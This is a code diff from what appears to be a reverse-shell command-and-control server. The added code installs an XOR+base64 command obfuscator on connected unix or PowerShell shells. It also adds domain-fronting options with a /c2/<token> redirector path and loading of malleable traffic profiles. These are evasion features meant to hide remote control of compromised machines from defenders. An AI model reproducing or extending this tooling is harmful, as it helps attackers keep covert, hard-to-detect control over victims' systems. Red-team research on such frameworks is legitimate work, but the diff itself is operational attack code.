+        obf_supported = (
+            inferred == 'unix'
+            or (inferred == 'windows' and win_shell == 'powershell')
+        )
+        if obf_supported:
+            obf = _CommandObfuscator(secrets.token_bytes(32))
+            if inferred == 'unix':
+                installer = _unix_obfuscator_installer(obf.hex)
+            else:
+                installer = _powershell_obfuscator_installer(obf.hex)
+            self.send_to_revshell(client_sock, installer)
+            self.recv_output(client_sock, timeout=0.5)
+            client_info['obfuscator'] = obf
+            logger = client_info.get('logger')
+            if logger:
+                logger.log_event('Command obfuscation installed (XOR+base64)')
+        else:
+            why = 'cmd.exe' if inferred == 'windows' else 'unknown shell'
+            logger = client_info.get('logger')
+            if logger:
+                logger.log_event(f'Command obfuscation skipped ({why})')
+
+        # Drain any residual output before finishing identification.
+        self.recv_output(client_sock, timeout=0.5)
 
         fingerprint = compute_fingerprint(client_info, probe_output)
         prior = self.registry.find_reconnect(
@@ -3399,6 +4485,23 @@ def main():
     parser.add_argument('-mp', '--mtls-port', type=int, default=9443, help='mTLS listener port')
     parser.add_argument('--h2-port', type=int, default=None,
                         help='HTTP/2 secondary listener port (e.g. 443). Omit to disable.')
+    parser.add_argument('--front-domain', default=None,
+                        help='Domain fronting: hostname the agent dials (SNI / Host). '
+                             'The redirector must forward /c2/<token> to this listener.')
+    parser.add_argument('--front-port', type=int, default=443,
+                        help='Port for --front-domain. Default 443.')
+    parser.add_argument('--profile', default=None,
+                        help='Path to a malleable profile JSON file loaded '
+                             'at handler start. Per-session overrides are '
+                             'available at runtime with '
+                             '`http2switch <ID> --profile <name>`.')
+    _default_profile_dir = os.path.join(
+        os.path.dirname(os.path.abspath(__file__)), 'profiles',
+    )
+    parser.add_argument('--profile-dir', default=_default_profile_dir,
+                        help='Directory of *.json profile files. Scanned by '
+                             '`http2switch` and the `profiles` command. '
+                             'Default: <package>/profiles/')
     parser.add_argument('-c', '--cert', default=os.path.join('tls_certs', 'server.pem'), help='TLS certificate file')
     parser.add_argument('-k', '--key', default=os.path.join('tls_certs', 'server.key'), help='TLS private key file')
     parser.add_argument('--mtls-ca-cert', default=os.path.join('mtls_certs', 'ca.pem'))
@@ -3424,6 +4527,13 @@ def main():
         mtls_client_cert=args.mtls_client_cert,
         mtls_client_key=args.mtls_client_key,
     )
+    # Attach fronting configuration after construction; keeps the
+    # TORNADOREVC2 signature unchanged.
+    srv._front_domain = args.front_domain
+    srv._front_port   = args.front_port
+    srv.profile_dir   = args.profile_dir
+    srv.profile       = _load_malleable_profile(args.profile)
+
     srv.start()
 
 
